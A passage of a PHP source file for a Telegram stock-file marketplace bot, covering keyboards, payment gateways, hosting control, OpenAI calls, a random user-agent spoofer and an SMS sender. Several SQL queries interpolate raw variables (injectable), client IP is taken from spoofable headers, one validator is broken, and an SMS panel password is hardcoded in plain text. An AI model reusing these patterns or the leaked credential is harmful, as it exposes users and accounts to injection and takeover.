                ['text' => "Refund $$price", 'callback_data' => "refund_$id:$payment:$price"]
            ]
        ]
    ]);
}
function retIKey19($target, $value) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "✅ SEND", 'callback_data' => "trc_$target:$value"]
            ]
        ]
    ]);
}
function retIKey20($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "CHECK THE PREVIEW", 'callback_data' => "sprv_$id"], ['text' => "REPLACE THE FILE", 'callback_data' => "sprplc_$id"]
            ],
            [
                ['text' => "ACCEPT", 'callback_data' => "accsp_$id"], ['text' => "REJECT", 'callback_data' => "rejsp_$id"]
            ]
        ]
    ]);
}
function retIKey21($id) {
    $bot_username = bot('getMe')->result->username;
    $downloads = getVFileDownloads($id);
    $price = getVFile($id, 'price');
    $ware = getVFile($id, 'ware');
    $license = getVFile($id, 'license');
    $dl = "https://t.me/$bot_username?start=market_$id";
    $result = json_encode([
        'inline_keyboard' => [
            [
                ['text' => "📥 Download", 'url' => $dl], ['text' => "💵 $price Stock Coins", 'callback_data' => 'nothing']
            ],
            [
                ['text' => "📥 Licenses: $downloads", 'callback_data' => 'nothing'], ['text' => "🗒 $license", 'callback_data' => 'nothing']
            ]
        ]
    ]);
    if($ware == '2') {
        $result = json_encode([
            'inline_keyboard' => [
                [
                    ['text' => "🛍 Buy", 'url' => $dl]
                ],
                [
                    ['text' => "💳 SOLD: $downloads", 'callback_data' => 'nothing'], ['text' => "💵 $price Stock Coins", 'callback_data' => 'nothing']
                ]
            ]
        ]);
    }
    return $result;
}
function retIKey22() {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "💸 Withdraw Money", 'callback_data' => 'withdraw']
            ]
        ]
    ]);
}
function retIKey23($id, $types) {
    $keyboards = [];
    foreach($types as $type => $info) {
        $keyboards[] = ['text' => "$info", 'callback_data' => "stblck_$id:$type"];
    }
    return json_encode(['inline_keyboard' => array_chunk($keyboards, 2)]);
}
function retIKey24($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "💸 CHARGE", 'callback_data' => "hostcharge_$id"]
            ],
            [
                ['text' => "🔐 PASSWORD CHANGE", 'callback_data' => "hostpassword_$id"], ['text' => "⚙️ CHANGE DOMAIN", 'callback_data' => "hostdomain_$id"]
            ]
        ]
    ]);
}
function retIKey25($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "✅ Confirm", 'callback_data' => "conf_$id:".time()]
            ]
        ]
    ]);
}
function retIKey26($image1, $image2) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "🖼 FIRST IMAGE", 'url' => $image1], ['text' => "🖼 SECOND IMAGE", 'url' => $image2]
            ]
        ]
    ]);
}
function retIKey27($id) {
    return json_encode([
        'inline_keyboard' => [
            [
                ['text' => "ACCEPT", 'callback_data' => "accsp_$id"], ['text' => "REJECT", 'callback_data' => "rejsp_$id"]
            ]
        ]
    ]);
}
function isImage($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOBODY, 1);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    if($result !== false) {
        return true;
    }
    return false;
}
function getAIAnswer($question) {
    $api = OPENAI_KEY;
    $url = 'https://api.openai.com/v1/chat/completions';
	$ch = curl_init($url);
	$payload = json_encode(array('model' => 'gpt-3.5-turbo', 'messages' => array(array('role' => 'user', 'content' => $question))));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json', "Authorization: Bearer $api"));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
function generateAIImage($details, $size = '1024x1024') {
    $api = OPENAI_KEY;
    $url = 'https://api.openai.com/v1/images/generations';
	$ch = curl_init($url);
	$payload = json_encode(array('prompt' => $details, 'n' => 1, 'size' => $size));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json', "Authorization: Bearer $api"));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}
function getAccessText($user_id) {
    $key = getUser($user_id, 'secret');
    if($key == '-1') $key = "N/A";
    $api_whole_time = number_format(getAPIUses($user_id));
    $api_months_time = number_format(getAPIUses($user_id, 30));
    $api_weeks_time = number_format(getAPIUses($user_id, 7));
    $api_day_time = number_format(getAPIUses($user_id, 1));
    $text = "<b>Your current API Access Key:</b> <code>$key</code>\n\n<b>* API URL:</b> <code>https://y4siiiin.com/api/</code> <b>GET</b>\n<b>- Parameters:</b> <code>url</code>, <code>secret</code>\n\n<b>* PRICE CHECKING:</b> <code>https://y4siiiin.com/api/check.php</code> <b>GET</b>\n<b>- Parameters:</b> <code>url</code>\n\n<b>CHECK API USES</b> <code>https://y4siiiin.com/api/uses/$key</code>\n\n<b>* API Requests</b>\n<b>- Whole Time:</b> <code>$api_whole_time</code>\n<b>- Last 30 Days:</b> <code>$api_months_time</code>\n<b>- Last 7 Days:</b> <code>$api_weeks_time</code>\n<b>- Today:</b> <code>$api_day_time</code>";
    return $text;
}
function getDirectory() {
    $directory = explode('/', getcwd());
    $directory = $directory[sizeof($directory)-1];
    return $directory;
}
function genPayPalCode() {
    $code = randomString(8);
    if(isPayPalPaymentExist($code)) {
        return genPayPalCode();
    }
    return $code;
}
function createPayPalPayment($user, $price, $stockcoins) {
    $url = 'https://www.paypal.com/cgi-bin/webscr';
    $bot_name = bot('getMe')->result->first_name;
    $number = genPayPalCode();
    $name = $bot_name.'_'.$number;
    sendQuery("INSERT INTO `paypalpayments` (`user`, `item_number`, `item_name`, `payment_status`, `amount`, `currency`, `txn_id`, `stockcoins`, `time`) VALUES ('$user', '$number', '$name', '0', '$price', 'USD', '0', '$stockcoins', '".time()."')");
	return $number;
}
function createTransaction($user, $amount, $stockcoins, $order_id, $pid) {
    $number = getUser($user, 'number');
    $directory = getDirectory();
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://nextpay.org/nx/gateway/token',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'api_key='.getSettings('toman').'&amount='.$amount.'&order_id='.$order_id.'&customer_phone='.$number.'&custom_json_fields='.json_encode(array('stockcoins' => $stockcoins, 'pid' => $pid)).'&callback_uri=https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/payment.php',
    ));
    $res = curl_exec($curl);
    curl_close($curl);
    $res = json_decode($res, true);
    $tr = $res['trans_id'];
    sendQuery("INSERT INTO `transactions` (`user`, `price`, `stockcoins`, `orderid`, `transid`, `paid`, `time`, `cardno`) VALUES ('$user', '$amount', '$stockcoins', '$order_id', '$tr', '0', '".time()."', '0')");
    return "https://nextpay.org/nx/gateway/payment/$tr";
}
function verifyTransaction($trans_id) {
    $price = getTrans($trans_id, 'price');
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://nextpay.org/nx/gateway/verify',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'api_key='.getSettings('toman').'&amount='.$price.'&trans_id='.$trans_id,
    ));
    $res = curl_exec($curl);
    curl_close($curl);
    return $res;
}
function orderToTrans($id) {
    global $db;
    $res = mysqli_query($db, "SELECT `transid` FROM `transactions` WHERE `orderid` = '$id'");
	$res = mysqli_fetch_assoc($res);
	return $res['transid'];
}
function isValidDomain($domain) {
    $pattern = '/(http[s]?\:\/\/)?(?!\-)(?:[a-zA-Z\d\-]{0,62}[a-zA-Z\d]\.){1,126}(?!\d+)[a-zA-Z\d]{1,63}/';
    return preg_match($pattern, $string);
}
function createHost($user_id, $domain, $email, $expire = 1) {
    $key = WHM_KEY;
    $username = randomString(6, true);
    $info = file_get_contents("https://n1stock.net/host/?act=create&key=$key&domain=$domain&username=$username&email=$email");
    $js = json_decode($info, true);
    if($js['status']) {
        createHosts($user_id, $domain, $username, $expire);
        return $js['result'];
    }
    else {
        if($js['result']['username_exist']) {
            return -1;
        }
        elseif($js['result']['domain_exist']) {
            return -2;
        }
    }
    return null;
}
function changeHost($username) {
    $key = WHM_KEY;
    $info = file_get_contents("https://n1stock.net/host/?act=password&key=$key&username=$username");
    $js = json_decode($info);
    if($js->status) {
        return $js->result->password;
    }
    return null;
}
function changeHostDomain($username, $domain) {
    $key = WHM_KEY;
    $info = file_get_contents("https://n1stock.net/host/?act=domain&key=$key&username=$username&domain=$domain");
    $js = json_decode($info);
    if($js->status) {
        return true;
    }
    return false;
}
function suspendHost($username) {
    $key = WHM_KEY;
    $info = file_get_contents("https://n1stock.net/host/?act=suspend&key=$key&username=$username");
    $js = json_decode($info);
    if($js->status) {
        return true;
    }
    return false;
}
function unSuspendHost($username) {
    $key = WHM_KEY;
    $info = file_get_contents("https://n1stock.net/host/?act=unsuspend&key=$key&username=$username");
    $js = json_decode($info);
    if($js->status) {
        return true;
    }
    return false;
}
function mentionUser($id, $name = true) {
    $firstname = bot('getChat', array('chat_id' => $id))->result->first_name;
    $fname = $id;
	if($name) {
        if(!is_null($firstname) && !empty($firstname) && strlen($firstname) > 1) {
            $fname = $firstname;
        }
    }
    return '<a href="tg://user?id='.$id.'">'.$fname.'</a>';
}
function getIP($ip = null, $deep_detect = true){
    if(filter_var($ip, FILTER_VALIDATE_IP) === false) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if($deep_detect) {
            if(filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if(filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
	else {
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    return $ip;
}
function isLink($string) {
    $pattern = '/(http[s]?\:\/\/)?(?!\-)(?:[a-zA-Z\d\-]{0,62}[a-zA-Z\d]\.){1,126}(?!\d+)[a-zA-Z\d]{1,63}/';
    return preg_match($pattern, $string);
}
function getGS($link) {
    $api = GS_API;
    
    $url = "https://getstocks.net/api/v1/getinfo?token=$api";
	$ch = curl_init($url);
	$payload = json_encode(array('link' => "$link", 'ispre' => 1));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	
	$data = json_decode($result, true);
	$id = $data['result']['support']['id'];
    $type = $data['result']['support']['type'];
    $slug = $data['result']['support']['slug'];
    
    $url = "https://getstocks.net/api/v1/getlink?token=$api";
	$ch = curl_init($url);
	$payload = json_encode(array('link' => "$link", 'ispre' => 1, 'type' => $type));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);

	$url = "https://getstocks.net/api/v1/download-status?token=$api";
	$ch = curl_init($url);
	$payload = json_encode(array('slug' => "$slug", 'id' => "$id", 'ispre' => 1, 'type' => $type));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	
	//file_put_contents('a.json', $result);
	//file_put_contents('a.json', json_encode(array('link' => $link, 'ispre' => 1, 'type' => $type, 'slug' => $slug, 'id' => $id)));

}
function getPayments($user, $dbid, $status = 1) {
    global $db;
    $payments = array();
    $res = mysqli_query($db, "SELECT * FROM `payments` WHERE `user_id` = '$user' AND `id` > '$dbid'");
    if($status != '1') {
        $res = mysqli_query($db, "SELECT * FROM `payments` WHERE `user_id` = '$user' AND `id` < '$dbid'");
    }
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($payments, $row['id']);
		}
    }
    else {
        return -1;
    }
    return $payments;
}
function sendAll($method, $datas = [], $users_table = 'users', $chatid_structure = 'id') {
    global $getall;
    $methods = ['get', 'list', 'remove'];
    function IsQueue($id) {
        global $getall;
        foreach($getall['list'] as $m => $v) {
            if($m == $id) return true;
        }
        return false;
    }
    if(in_array(strtolower($method), $methods)) {
        if(strtolower($method) == $methods[0]) {
            if(IsQueue($datas['id'])) {
                return [
                    'status' => true,
                    'send'=>$getall['list'][$datas['id']]['send'],
                    'type'=>$getall['list'][$datas['id']]['type'],
                    'data'=>$getall['list'][$datas['id']]['data']
                ];
            }
            else {
                return ['status' => false, 'result' => 'queue error'];
            }
        }
        elseif(strtolower($method) == $methods[1]) {
            $pending_list = [];
            foreach($getall['list'] as $p => $val)
                $pending_list[] = $p;
            return ['status' => true, 'list'=>$pending_list];
        }
        elseif(strtolower($method) == $methods[2]) {
            if(IsQueue($datas['id'])) {
                unset($getall['list'][$datas['id']]);
                file_put_contents('sendtoall.json', json_encode($getall));
                return ['status' => true];
            }
            else {
                return ['status' => false, 'result' => 'queue error'];
            }
        }
        return;
    }
    $id = rand(111111, 999999);
    $getall['list'][$id] = [
        'send' => 0,
        'type' => $method,
        'data' => json_encode($datas),
        'user_table' => $users_table,
        'chatid_structure' => $chatid_structure
    ];
    file_put_contents('sendtoall.json', json_encode($getall));
    return ['status' => true, 'result' => $id];
}
class userAgent {
    /**
     * Windows Operating System list with dynamic versioning
     * @var array $windows_os
     */
    public $windows_os = [ '[Windows; |Windows; U; |]Windows NT 6.:number0-3:;[ Win64; x64| WOW64| x64|]',
                           '[Windows; |Windows; U; |]Windows NT 10.:number0-5:;[ Win64; x64| WOW64| x64|]', ];
    /**
     * Linux Operating Systems [limited]
     * @var array $linux_os
     */
    public $linux_os = [ '[Linux; |][U; |]Linux x86_64',
                         '[Linux; |][U; |]Linux i:number5-6::number4-8::number0-6: [x86_64|]' ];
    /**
     * Mac Operating System (OS X) with dynamic versioning
     * @var array $mac_os
     */
    public $mac_os = [ 'Macintosh; [U; |]Intel Mac OS X :number7-9:_:number0-9:_:number0-9:',
                       'Macintosh; [U; |]Intel Mac OS X 10_:number0-12:_:number0-9:' ];
    /**
     * Versions of Android to be used
     * @var array $androidVersions
     */
    public $androidVersions = [ '4.3.1',
                                '4.4',
                                '4.4.1',
                                '4.4.4',
                                '5.0',
                                '5.0.1',
                                '5.0.2',
                                '5.1',
                                '5.1.1',
                                '6.0',
                                '6.0.1',
                                '7.0',
                                '7.1',
                                '7.1.1' ];
    /**
     * Holds the version of android for the User Agent being generated
     * @property string $androidVersion
     */
    public $androidVersion;
    /**
     * Android devices and for specific android versions
     * @var array $androidDevices
     */
    public $androidDevices = [ '4.3' => [ 'GT-I9:number2-5:00 Build/JDQ39',
                                          'Nokia 3:number1-3:[10|15] Build/IMM76D',
                                          '[SAMSUNG |]SM-G3:number1-5:0[R5|I|V|A|T|S] Build/JLS36C',
                                          'Ascend G3:number0-3:0 Build/JLS36I',
                                          '[SAMSUNG |]SM-G3:number3-6::number1-8::number0-9:[V|A|T|S|I|R5] Build/JLS36C',
                                          'HUAWEI G6-L:number10-11: Build/HuaweiG6-L:number10-11:',
                                          '[SAMSUNG |]SM-[G|N]:number7-9:1:number0-8:[S|A|V|T] Build/[JLS36C|JSS15J]',
                                          '[SAMSUNG |]SGH-N0:number6-9:5[T|V|A|S] Build/JSS15J',
                                          'Samsung Galaxy S[4|IV] Mega GT-I:number89-95:00 Build/JDQ39',
                                          'SAMSUNG SM-T:number24-28:5[s|a|t|v] Build/[JLS36C|JSS15J]',
                                          'HP :number63-73:5 Notebook PC Build/[JLS36C|JSS15J]',
                                          'HP Compaq 2:number1-3:10b Build/[JLS36C|JSS15J]',
                                          'HTC One 801[s|e] Build/[JLS36C|JSS15J]',
                                          'HTC One max Build/[JLS36C|JSS15J]',
                                          'HTC Xplorer A:number28-34:0[e|s] Build/GRJ90', ],
                               '4.4' => [ 'XT10:number5-8:0 Build/SU6-7.3',
                                          'XT10:number12-52: Build/[KXB20.9|KXC21.5]',
                                          'Nokia :number30-34:10 Build/IMM76D',
                                          'E:number:20-23::number0-3::number0-4: Build/24.0.[A|B].1.34',
                                          '[SAMSUNG |]SM-E500[F|L] Build/KTU84P',
                                          'LG Optimus G Build/KRT16M',
                                          'LG-E98:number7-9: Build/KOT49I',
                                          'Elephone P:number2-6:000 Build/KTU84P',
                                          'IQ450:number0-4: Quad Build/KOT49H',
                                          'LG-F:number2-5:00[K|S|L] Build/KOT49[I|H]',
                                          'LG-V:number3-7::number0-1:0 Build/KOT49I',
                                          '[SAMSUNG |]SM-J:number1-2::number0-1:0[G|F] Build/KTU84P',
                                          '[SAMSUNG |]SM-N80:number0-1:0 Build/[KVT49L|JZO54K]',
                                          '[SAMSUNG |]SM-N900:number5-8: Build/KOT49H',
                                          '[SAMSUNG-|]SGH-I337[|M] Build/[JSS15J|KOT49H]',
                                          '[SAMSUNG |]SM-G900[W8|9D|FD|H|V|FG|A|T] Build/KOT49H',
                                          '[SAMSUNG |]SM-T5:number30-35: Build/[KOT49H|KTU84P]',
                                          '[Google |]Nexus :number5-7: Build/KOT49H',
                                          'LG-H2:number0-2:0 Build/KOT49[I|H]',
                                          'HTC One[_M8|_M9|0P6B|801e|809d|0P8B2|mini 2|S][ dual sim|] Build/[KOT49H|KTU84L]',
                                          '[SAMSUNG |]GT-I9:number3-5:0:number0-6:[V|I|T|N] Build/KOT49H',
                                          'Lenovo P7:number7-8::number1-6: Build/[Lenovo|JRO03C]',
                                          'LG-D95:number1-8: Build/KOT49[I|H]',
                                          'LG-D:number1-8::number0-8:0 Build/KOT49[I|H]',
                                          'Nexus5 V:number6-7:.1 Build/KOT49H',
                                          'Nexus[_|] :number4-10: Build/[KOT49H|KTU84P]',
                                          'Nexus[_S_| S ][4G |]Build/GRJ22',
                                          '[HM NOTE|NOTE-III|NOTE2 1LTE[TD|W|T]',
                                          'ALCATEL ONE[| ]TOUCH 70:number2-4::number0-9:[X|D|E|A] Build/KOT49H',
                                          'MOTOROLA [MOTOG|MSM8960|RAZR] Build/KVT49L' ],
                               '5.0' => [ 'Nokia :number10-11:00 [wifi|4G|LTE] Build/GRK39F',
                                          'HTC 80:number1-2[s|w|e|t] Build/[LRX22G|JSS15J]',
                                          'Lenovo A7000-a Build/LRX21M;',
                                          'HTC Butterfly S [901|919][s|d|] Build/LRX22G',
                                          'HTC [M8|M9|M8 Pro Build/LRX22G',
                                          'LG-D3:number25-37: Build/LRX22G',
                                          'LG-D72:number0-9: Build/LRX22G',
                                          '[SAMSUNG |]SM-G4:number0-9:0 Build/LRX22[G|C]',
                                          '[|SAMSUNG ]SM-G9[00|25|20][FD|8|F|F-ORANGE|FG|FQ|H|I|L|M|S|T] Build/[LRX21T|KTU84F|KOT49H]',
                                          '[SAMSUNG |]SM-A:number7-8:00[F|I|T|H|] Build/[LRX22G|LMY47X]',
                                          '[SAMSUNG-|]SM-N91[0|5][A|V|F|G|FY] Build/LRX22C',
                                          '[SAMSUNG |]SM-[T|P][350|550|555|355|805|800|710|810|815] Build/LRX22G',
                                          'LG-D7:number0-2::number0-9: Build/LRX22G',
                                          '[LG|SM]-[D|G]:number8-9::number0-5::number0-9:[|P|K|T|I|F|T1] Build/[LRX22G|KOT49I|KVT49L|LMY47X]' ],
                               '5.1' => [ 'Nexus :number5-9: Build/[LMY48B|LRX22C]',
                                          '[|SAMSUNG ]SM-G9[28|25|20][X|FD|8|F|F-ORANGE|FG|FQ|H|I|L|M|S|T] Build/[LRX22G|LMY47X]',
                                          '[|SAMSUNG ]SM-G9[35|350][X|FD|8|F|F-ORANGE|FG|FQ|H|I|L|M|S|T] Build/[MMB29M|LMY47X]',
                                          '[MOTOROLA |][MOTO G|MOTO G XT1068|XT1021|MOTO E XT1021|MOTO XT1580|MOTO X FORCE XT1580|MOTO X PLAY XT1562|MOTO XT1562|MOTO XT1575|MOTO X PURE XT1575|MOTO XT1570 MOTO X STYLE] Build/[LXB22|LMY47Z|LPC23|LPK23|LPD23|LPH223]' ],
                               '6.0' => [ '[SAMSUNG |]SM-[G|D][920|925|928|9350][V|F|I|L|M|S|8|I] Build/[MMB29K|MMB29V|MDB08I|MDB08L]',
                                          'Nexus :number5-7:[P|X|] Build/[MMB29K|MMB29V|MDB08I|MDB08L]',
                                          'HTC One[_| ][M9|M8|M8 Pro] Build/MRA58K',
                                          'HTC One[_M8|_M9|0P6B|801e|809d|0P8B2|mini 2|S][ dual sim|] Build/MRA58K' ],
                               '7.0' => [ 'Pixel [XL|C] Build/[NRD90M|NME91E]',
                                          'Nexus :number5-9:[X|P|] Build/[NPD90G|NME91E]',
                                          '[SAMSUNG |]GT-I:number91-98:00 Build/KTU84P',
                                          'Xperia [V |]Build/NDE63X',
                                          'LG-H:number90-93:0 Build/NRD90[C|M]' ],
                               '7.1' => [ 'Pixel [XL|C] Build/[NRD90M|NME91E]',
                                          'Nexus :number5-9:[X|P|] Build/[NPD90G|NME91E]',
                                          '[SAMSUNG |]GT-I:number91-98:00 Build/KTU84P',
                                          'Xperia [V |]Build/NDE63X',
                                          'LG-H:number90-93:0 Build/NRD90[C|M]' ] ];
    /**
     * List of "OS" strings used for android
     * @var array $android_os
     */
    public $android_os = [ 'Linux; Android :androidVersion:; :androidDevice:',
                           //TODO: Add a $windowsDevices variable that does the same as androidDevice
                           //'Windows Phone 10.0; Android :androidVersion:; :windowsDevice:',
                           'Linux; U; Android :androidVersion:; :androidDevice:',
                           'Android; Android :androidVersion:; :androidDevice:', ];
    /**
     * List of "OS" strings used for iOS
     * @var array $mobile_ios
     */
    public $mobile_ios = [ 'iphone' => 'iPhone; CPU iPhone OS :number7-11:_:number0-9:_:number0-9:; like Mac OS X;',
                           'ipad' => 'iPad; CPU iPad OS :number7-11:_:number0-9:_:number0-9: like Mac OS X;',
                           'ipod' => 'iPod; CPU iPod OS :number7-11:_:number0-9:_:number0-9:; like Mac OS X;', ];
    
    /**
     * Get a random operating system
     * @param null|string $os
     * @return string *
     */
    public function getOS($os = NULL) {
        $_os = [];
        if($os === NULL || in_array($os, [ 'chrome', 'firefox', 'explorer' ])) {
            $_os = $os === 'explorer' ? $this->windows_os : array_merge($this->windows_os, $this->linux_os, $this->mac_os);
        } else {
            $_os += $this->{$os . '_os'};
        }
        // randomly select on operating system
        $selected_os = rtrim($_os[random_int(0, count($_os) - 1)], ';');
        
        // check for spin syntax
        if(strpos($selected_os, '[') !== FALSE) {
            $selected_os = self::processSpinSyntax($selected_os);
        }
        
        // check for random number syntax
        if(strpos($selected_os, ':number') !== FALSE) {
            $selected_os = self::processRandomNumbers($selected_os);
        }
        
        if(random_int(1, 100) > 50) {
            $selected_os .= '; en-US';
        }
        return $selected_os;
    }
    
    /**
     * Get Mobile OS
     * @param null|string $os Can specifiy android, iphone, ipad, ipod, or null/blank for random
     * @return string *
     */
    public function getMobileOS($os = NULL) {
        $os = strtolower($os);
        $_os = [];
        switch( $os ) {
            case'android':
                $_os += $this->android_os;
            break;
            case 'iphone':
            case 'ipad':
            case 'ipod':
                $_os[] = $this->mobile_ios[$os];
            break;
            default:
                $_os = array_merge($this->android_os, array_values($this->mobile_ios));
        }
        // select random mobile os
        $selected_os = rtrim($_os[random_int(0, count($_os) - 1)], ';');
        if(strpos($selected_os, ':androidVersion:') !== FALSE) {
            $selected_os = $this->processAndroidVersion($selected_os);
        }
        if(strpos($selected_os, ':androidDevice:') !== FALSE) {
            $selected_os = $this->addAndroidDevice($selected_os);
        }
        if(strpos($selected_os, ':number') !== FALSE) {
            $selected_os = self::processRandomNumbers($selected_os);
        }
        return $selected_os;
    }
    
    /**
     *  static::processRandomNumbers
     * @param $selected_os
     * @return null|string|string[] *
     */
    public static function processRandomNumbers($selected_os) {
        return preg_replace_callback('/:number(\d+)-(\d+):/i', function($matches) { return random_int($matches[1], $matches[2]); }, $selected_os);
    }
    
    /**
     *  static::processSpinSyntax
     * @param $selected_os
     * @return null|string|string[] *
     */
    public static function processSpinSyntax($selected_os) {
        return preg_replace_callback('/\[([\w\-\s|;]*?)\]/i', function($matches) {
            $shuffle = explode('|', $matches[1]);
            return $shuffle[array_rand($shuffle)];
        }, $selected_os);
    }
    
    /**
     * processAndroidVersion
     * @param $selected_os
     * @return null|string|string[] *
     */
    public function processAndroidVersion($selected_os) {
        $this->androidVersion = $version = $this->androidVersions[array_rand($this->androidVersions)];
        return preg_replace_callback('/:androidVersion:/i', function($matches) use ($version) { return $version; }, $selected_os);
    }
    
    /**
     * addAndroidDevice
     * @param $selected_os
     * @return null|string|string[] *
     */
    public function addAndroidDevice($selected_os) {
        $devices = $this->androidDevices[substr($this->androidVersion, 0, 3)];
        $device  = $devices[array_rand($devices)];
        
        $device = self::processSpinSyntax($device);
        return preg_replace_callback('/:androidDevice:/i', function($matches) use ($device) { return $device; }, $selected_os);
    }
    
    /**
     *  static::chromeVersion
     * @param $version
     * @return string *
     */
    public static function chromeVersion($version) {
        return random_int($version['min'], $version['max']) . '.0.' . random_int(1000, 4000) . '.' . random_int(100, 400);
    }
    
    /**
     *  static::firefoxVersion
     * @param $version
     * @return string *
     */
    public static function firefoxVersion($version) {
        return random_int($version['min'], $version['max']) . '.' . random_int(0, 9);
    }
    
    /**
     *  static::windows
     * @param $version
     * @return string *
     */
    public static function windows($version) {
        return random_int($version['min'], $version['max']) . '.' . random_int(0, 9);
    }
    
    /**
     * generate
     * @param null $userAgent
     * @return string *
     */
    public function generate($userAgent = NULL) {
        if($userAgent === NULL) {
            $r = random_int(0, 100);
            if($r >= 44) {
                $userAgent = array_rand([ 'firefox' => 1, 'chrome' => 1, 'explorer' => 1 ]);
            } else {
                $userAgent = array_rand([ 'iphone' => 1, 'android' => 1, 'mobile' => 1 ]);
            }
        } elseif($userAgent == 'windows' || $userAgent == 'mac' || $userAgent == 'linux') {
            $agents = [ 'firefox' => 1, 'chrome' => 1 ];
            if($userAgent == 'windows') {
                $agents['explorer'] = 1;
            }
            $userAgent = array_rand($agents);
        }
        $_SESSION['agent'] = $userAgent;
        if($userAgent == 'chrome') {
            return 'Mozilla/5.0 (' . $this->getOS($userAgent) . ') AppleWebKit/' . (random_int(1, 100) > 50 ? random_int(533, 537) : random_int(600, 603)) . '.' . random_int(1, 50) . ' (KHTML, like Gecko) Chrome/' . self::chromeVersion([ 'min' => 47,
                                                                                                                                                                                                                                              'max' => 55 ]) . ' Safari/' . (random_int(1, 100) > 50 ? random_int(533, 537) : random_int(600, 603));
        } elseif($userAgent == 'firefox') {
            
            return 'Mozilla/5.0 (' . $this->getOS($userAgent) . ') Gecko/' . (random_int(1, 100) > 30 ? '20100101' : '20130401') . ' Firefox/' . self::firefoxVersion([ 'min' => 45,
                                                                                                                                                                        'max' => 74 ]);
        } elseif($userAgent == 'explorer') {
            
            return 'Mozilla / 5.0 (compatible; MSIE ' . ($int = random_int(7, 11)) . '.0; ' . $this->getOS('windows') . ' Trident / ' . ($int == 7 || $int == 8 ? '4' : ($int == 9 ? '5' : ($int == 10 ? '6' : '7'))) . '.0)';
        } elseif($userAgent == 'mobile' || $userAgent == 'android' || $userAgent == 'iphone' || $userAgent == 'ipad' || $userAgent == 'ipod') {
            
            return 'Mozilla/5.0 (' . $this->getMobileOS($userAgent) . ') AppleWebKit/' . (random_int(1, 100) > 50 ? random_int(533, 537) : random_int(600, 603)) . '.' . random_int(1, 50) . ' (KHTML, like Gecko)  Chrome/' . self::chromeVersion([ 'min' => 47,
                                                                                                                                                                                                                                                     'max' => 55 ]) . ' Mobile Safari/' . (random_int(1, 100) > 50 ? random_int(533, 537) : random_int(600, 603)) . '.' . random_int(0, 9);
        } else {
            new Exception('Unable to determine user agent to generate');
        }
    }
}
    function sms($number,$sms){
                $request = new HttpRequest();
                $request->setUrl('http://rest.payamak-panel.com/api/SendSMS/SendSMS');
                $request->setMethod(HTTP_METH_POST);

        $request->setHeaders(array(
            'content-type' => 'application/x-www-form-urlencoded',
            'postman-token' => '26f3cadd-f3c7-4049-a107-b74579cdaae2',
         'cache-control' => 'no-cache'
));

        $request->setContentType('application/x-www-form-urlencoded');
        $request->setPostFields(array(
           'username' => 'n1stock',
           'password' => 'fv5VABz%[CgWV^',
           'to' => $number,
           'from' => '50004000673644',
           'text' => $sms,
           'isflash' => 'false'
));

   try {
       $request->send();
       } catch (HttpException $ex) {
    }
}